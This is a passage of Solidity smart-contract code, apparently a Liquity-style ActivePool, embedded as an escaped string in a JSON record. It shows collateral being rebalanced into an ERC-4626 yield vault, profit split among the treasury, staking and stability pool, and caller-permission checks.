vars.yieldGenerator = IERC4626(yieldGenerator[_collateral]);\n        vars.ownedShares = vars.yieldGenerator.balanceOf(address(this));\n        vars.sharesToAssets = vars.yieldGenerator.convertToAssets(vars.ownedShares);\n\n        // if we have profit that's more than the threshold, record it for withdrawal and redistribution\n        vars.profit = vars.sharesToAssets.sub(vars.currentAllocated);\n        if (vars.profit < yieldClaimThreshold[_collateral]) {\n            vars.profit = 0;\n        }\n        \n        // what % of the final pool balance would the current allocation be?\n        vars.finalBalance = collAmount[_collateral].sub(_amountLeavingPool);\n        vars.percentOfFinalBal = vars.finalBalance == 0 ? uint256(-1) : vars.currentAllocated.mul(10_000).div(vars.finalBalance);\n\n        // if abs(percentOfFinalBal - yieldingPercentage) > drift, we will need to deposit more or withdraw some\n        vars.yieldingPercentage = yieldingPercentage[_collateral];\n        vars.finalYieldingAmount = vars.finalBalance.mul(vars.yieldingPercentage).div(10_000);\n        vars.yieldingAmount = yieldingAmount[_collateral];\n        if (vars.percentOfFinalBal > vars.yieldingPercentage && vars.percentOfFinalBal.sub(vars.yieldingPercentage) > yieldingPercentageDrift) {\n            // we will end up overallocated, withdraw some\n            vars.toWithdraw = vars.currentAllocated.sub(vars.finalYieldingAmount);\n            vars.yieldingAmount = vars.yieldingAmount.sub(vars.toWithdraw);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        } else if(vars.percentOfFinalBal < vars.yieldingPercentage && vars.yieldingPercentage.sub(vars.percentOfFinalBal) > yieldingPercentageDrift) {\n            // we will end up underallocated, deposit more\n            vars.toDeposit = vars.finalYieldingAmount.sub(vars.currentAllocated);\n            vars.yieldingAmount = vars.yieldingAmount.add(vars.toDeposit);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        }\n\n        // + means deposit, - means withdraw\n        vars.netAssetMovement = int256(vars.toDeposit) - int256(vars.toWithdraw) - int256(vars.profit);\n        if (vars.netAssetMovement > 0) {\n            IERC20(_collateral).safeIncreaseAllowance(yieldGenerator[_collateral], uint256(vars.netAssetMovement));\n            IERC4626(yieldGenerator[_collateral]).deposit(uint256(vars.netAssetMovement), address(this));\n        } else if (vars.netAssetMovement < 0) {\n            IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));\n        }\n\n        // if we recorded profit, recalculate it for precision and distribute\n        if (vars.profit != 0) {\n            // profit is ultimately (coll at hand) + (coll allocated to yield generator) - (recorded total coll Amount in pool)\n            vars.profit = IERC20(_collateral).balanceOf(address(this)).add(vars.yieldingAmount).sub(collAmount[_collateral]);\n            if (vars.profit != 0) {\n                // distribute to treasury, staking pool, and stability pool\n                vars.treasurySplit = vars.profit.mul(yieldSplitTreasury).div(10_000);\n                if (vars.treasurySplit != 0) {\n                    IERC20(_collateral).safeTransfer(treasuryAddress, vars.treasurySplit);\n                }\n\n                vars.stakingSplit = vars.profit.mul(yieldSplitStaking).div(10_000);\n                if (vars.stakingSplit != 0) {\n                    IERC20(_collateral).safeTransfer(lqtyStakingAddress, vars.stakingSplit);\n                    ILQTYStaking(lqtyStakingAddress).increaseF_Collateral(_collateral, vars.stakingSplit);\n                }\n\n                vars.stabilityPoolSplit = vars.profit.sub(vars.treasurySplit.add(vars.stakingSplit));\n                if (vars.stabilityPoolSplit != 0) {\n                    IERC20(_collateral).safeTransfer(stabilityPoolAddress, vars.stabilityPoolSplit);\n                    IStabilityPool(stabilityPoolAddress).updateRewardSum(_collateral, vars.stabilityPoolSplit);   \n                }\n            }\n        }\n    }\n\n    // --- 'require' functions ---\n\n    function _requireValidCollateralAddress(address _collateral) internal view {\n        require(\n            ICollateralConfig(collateralConfigAddress).isCollateralAllowed(_collateral),\n            \"Invalid collateral address\"\n        );\n    }\n\n    function _requireCallerIsBorrowerOperationsOrDefaultPool() internal view {\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == defaultPoolAddress,\n            \"ActivePool: Caller is neither BO nor Default Pool\");\n    }\n\n    function _requireCallerIsBOorTroveMorSP() internal view {\n        address redemptionHelper = address(ITroveManager(troveManagerAddress).redemptionHelper());\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == troveManagerAddress ||\n            msg.sender == redemptionHelper ||\n            msg.sender == stabilityPoolAddress,\n            \"ActivePool: Caller is neither BorrowerOperations nor TroveManager nor StabilityPool\");\n    }\n\n    function _requireCallerIsBOorTroveM() internal view {"
    }
  ]
}